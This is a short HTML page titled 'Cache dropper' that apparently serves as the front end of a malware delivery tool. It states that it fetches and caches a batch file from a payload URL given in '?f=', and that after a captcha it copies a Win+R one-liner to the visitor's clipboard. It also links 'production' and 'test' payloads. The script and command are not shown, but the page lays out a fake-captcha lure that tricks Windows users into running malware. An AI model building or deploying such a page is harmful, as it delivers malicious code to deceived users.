<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Cache dropper</title>
  <script src="/consent.js"></script>
</head>
<body>
  <h1>Cache dropper</h1>
  <p>Deploy version: <strong id="version">…</strong></p>
  <p>Pass the payload URL via <code>?f=</code>. On load, the page fetches and caches the batch file. After captcha, the Win+R one-liner is copied to your clipboard.</p>
  <p>
    <a href="?f=/j">?f=/j</a> (production payload) ·
    <a href="?f=/hello.txt">?f=/hello.txt</a> (test payload)
  </p>
  <p>Optional debug: <span id="status">loading…</span></p>
  <pre id="preview"></pre>
</body>
</html>
